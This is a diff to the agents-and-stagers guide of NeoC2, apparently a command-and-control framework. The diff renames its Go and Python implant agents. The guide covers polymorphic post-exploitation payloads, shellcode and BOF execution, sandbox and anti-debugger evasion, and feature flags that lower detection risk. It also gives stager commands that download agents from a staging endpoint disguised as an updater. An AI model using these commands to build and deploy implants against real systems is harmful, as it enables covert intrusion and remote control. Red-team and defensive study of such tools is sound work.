@@ -1,19 +1,19 @@
 # NeoC2 Agents and Stagers Guide
 
 ## Table of Contents
-- [Go Agent](#go-agent)
-- [Phantom Hawk Agent](#phantom-hawk-agent)
+- [Trinity Agent](#trinity-agent)
+- [Seraph Agent](#seraph-agent)
 - [Droppers](#droppers)
 
 ---
 
-## Go Agent
+## Trinity Agent
 
-The Go Agent is a Windows-based, feature-rich polymorphic payload designed for advanced operations. It is compiled to a native executable and provides extensive capabilities for post-exploitation activities.
+The Trinity Agent is a Golang, Windows-based, feature-rich polymorphic payload designed for advanced operations. It is compiled to a native executable and provides extensive capabilities for post-exploitation activities.
 
 ### Architecture
 
-The Go Agent is built with a modular architecture that allows operators to customize the payload size and functionality by including or excluding specific features. This architecture separates core C2 functionality from advanced features, enabling operators to create lightweight payloads when advanced capabilities are not needed.
+The Trinity Agent is built with a modular architecture that allows operators to customize the payload size and functionality by including or excluding specific features. This architecture separates core C2 functionality from advanced features, enabling operators to create lightweight payloads when advanced capabilities are not needed.
 
 #### Core Components
 - **Communication Layer**: Handles registration, task retrieval, and result submission
@@ -56,7 +56,7 @@ The agent supports the following modular features that can be selectively includ
 
 ### Feature Flags
 
-The Go Agent supports feature exclusion flags to reduce payload size, complexity and detection risk:
+The Trinity Agent supports feature exclusion flags to reduce payload size, complexity and detection risk:
 
 #### Available Exclusion Flags
 
@@ -71,22 +71,22 @@ The Go Agent supports feature exclusion flags to reduce payload size, complexity
 
 **Default agent with all features:**
 ```
-payload go_agent web_app_default
+payload trinity web_app_default
 ```
 
 **Agent excluding BOF execution:**
 ```
-payload go_agent web_app_default --no-bof
+payload trinity web_app_default --no-bof
 ```
 
 **Agent excluding multiple features:**
 ```
-payload go_agent web_app_default --no-bof --no-assembly --no-pe
+payload trinity web_app_default --no-bof --no-assembly --no-pe
 ```
 
 **Agent with all advanced features excluded:**
 ```
-payload go_agent web_app_default --no-bof --no-assembly --no-pe --no-shellcode --no-reverse-proxy --no-sandbox
+payload trinity web_app_default --no-bof --no-assembly --no-pe --no-shellcode --no-reverse-proxy --no-sandbox
 ```
 
 ### Payload Generation
@@ -147,10 +147,10 @@ Feature exclusion provides the following benefits:
 - **Simpler execution**: Fewer checks and capabilities to process
 
 
-## Phantom Hawk Agent 
+## Seraph Agent
 
 ### Description
-Phantom Hawk is a Python variant with limited capability.
+Seraph is a Python variant with limited capability.
 
 ### Tested
 - Windows x64 (Compile to exe on a Windows host)
@@ -185,17 +185,17 @@ NeoC2 [INTERACTIVE:abc123] > [reverse_proxy_start, reverse_proxy_stop, cmd, pwsh
 
 **Default agent**
 ```
-payload phantom_hawk_agent web_app_default
+payload seraph web_app_default
 ```
 
 **Agent with disabled sandbox detection and anti-debuggers**
 ```
-payload phantom_hawk_agent web_app_default --disable-sandbox
+payload seraph web_app_default --disable-sandbox
 ```
 
 **Agent with embeded failover servers**
 ```
-payload phantom_hawk_agent web_app_default --use-failover
+payload seraph web_app_default --use-failover
 ```
 
 ## Droppers
@@ -220,7 +220,7 @@ stager generate linux_binary host=<c2_host> port=<c2_port> [protocol=https] [dow
 ### Usage Examples
 ```
 # Upload Agent to a non-default custom staging endpoint
-payload_upload upload logs/payload_web_app_default_phantom_hawk_agent_20251224_175614.py uri=/api/ag.py
+payload_upload upload logs/payload_web_app_default_seraph_20251224_175614.py uri=/api/ag.py
 
 # Stager downloads Agent from https://127.0.0.1:7443/api/ag.py
 stager generate linux_binary host=127.0.0.1 port=7443 protocol=https download_uri=/api/ag.py
@@ -241,7 +241,7 @@ stager generate windows_exe host=<c2_host> port=<c2_port> [protocol=https] [down
 ### Usage Examples
 ```
 # Upload Agent to a non-default custom staging endpoint
-payload_upload upload logs/go_agent_20251224_175614.py uri=/api/updater.exe
+payload_upload upload logs/trinity_20251224_175614.py uri=/api/updater.exe
 
 # Stager downloads Agent from https://127.0.0.1:7443/api/updater.exe
 stager generate windows_exe host=127.0.0.1 port=7443 protocol=https download_uri=/api/updater.exe
